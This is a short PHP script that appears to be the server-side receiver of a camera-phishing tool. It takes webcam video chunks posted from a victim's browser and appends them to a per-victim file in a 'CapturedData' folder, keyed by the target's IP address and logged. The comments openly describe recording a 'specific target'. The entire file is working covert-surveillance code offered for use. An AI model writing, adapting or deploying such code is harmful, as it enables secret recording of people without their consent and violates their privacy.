<?php
// Get the victim's IP address to use as a unique filename.
// This is a simple way to associate the recording with a specific target.
$ip_file = 'ip.txt';
$ip_address = file_get_contents($ip_file);
// Sanitize the IP address to make it a valid filename component.
$sanitized_ip = preg_replace('/[^0-9a-zA-Z.-]/', '_', $ip_address);
$video_filename = '../../CapturedData/video_' . $sanitized_ip . '.webm';

// Get the raw POST data which contains the video chunk.
$video_chunk = file_get_contents('php://input');

if (!empty($video_chunk)) {
    // Log that a video chunk was received.
    error_log("[#] Video chunk received for " . $sanitized_ip . "\r\n", 3, "Log.log");

    // Append the chunk to the video file.
    // The FILE_APPEND flag is crucial for building the video file over multiple requests.
    $fp = fopen($video_filename, 'a');
    if ($fp) {
        fwrite($fp, $video_chunk);
        fclose($fp);
    } else {
        error_log("[!] Failed to open video file for writing: " . $video_filename . "\r\n", 3, "Log.log");
    }
} else {
    error_log("[!] Received empty video chunk." . "\r\n", 3, "Log.log");
}

// Respond to the client. An empty response is sufficient.
exit();
?>
